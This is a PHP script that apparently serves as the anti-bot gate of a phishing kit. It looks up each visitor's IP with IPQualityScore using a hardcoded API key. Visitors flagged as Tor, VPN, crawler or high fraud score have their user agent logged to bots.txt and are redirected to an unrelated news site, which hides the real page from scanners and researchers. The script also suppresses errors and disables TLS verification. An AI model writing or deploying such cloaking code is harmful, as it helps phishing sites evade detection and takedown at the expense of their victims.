<?php
error_reporting(0);

function MIP()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif (filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$ip = MIP();

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}


$ch = curl_init();
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/uGmSxTxyMCZvO30MyNkHv4Ucsx9Cuh0d/".$ip."");
curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
curl_setopt($ch,CURLOPT_TIMEOUT,400);
$json=curl_exec($ch);
$success = trim(strip_tags(get_string_between($json,'success":',',"')));
$isp = trim(strip_tags(get_string_between($json,'"ISP":"','","')));
$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
$region = trim(strip_tags(get_string_between($json,'region":"','","')));
$city = trim(strip_tags(get_string_between($json,'city":"','","')));
$timezone = trim(strip_tags(get_string_between($json,'timezone":"','","')));
$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));

if ($fraud_score >= 75 || $tor == "true" || $vpn == "true" || $is_crawler == "true") {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
    $save = fopen("./bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header('Location: https://www.masrawy.com');
    exit();
}
